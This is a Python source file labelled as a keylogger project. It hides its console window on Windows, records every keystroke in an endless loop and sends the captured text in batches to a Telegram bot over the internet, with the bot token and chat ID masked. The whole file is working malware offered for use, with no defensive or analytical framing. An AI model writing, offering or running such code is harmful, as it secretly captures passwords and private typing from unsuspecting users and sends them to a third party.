codtech ( keylogger )
import requests
import keyboard
import ctypes
import os

# Hide the console window (only on Windows)
def hide_console():
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Hide the console window at the start
hide_console()

print("start")

# Your Telegram bot token
token = "74073xxxxxxxxxxxxxxxxxxxx"
url = f"https://api.telegram.org/bot{token}/sendMessage"

# Chat ID to send the messages to
chat_id = "1453xxxxxxxxxxx"

data = ""
while True:
    a = keyboard.read_key()
    data += f"{a} "
    if len(data) > 20:
        print(data)
        pram = {"chat_id": chat_id, "text": data}
        print(url, pram)
        res = requests.post(url, data=pram)
        if res.status_code == 200:
            print("Message sent successfully!")
        else:
            print("Failed to send message.")
            print(f"Status Code: {res.status_code}")
            print(f"Response: {res.json()}")
        data = ""
        print(data)
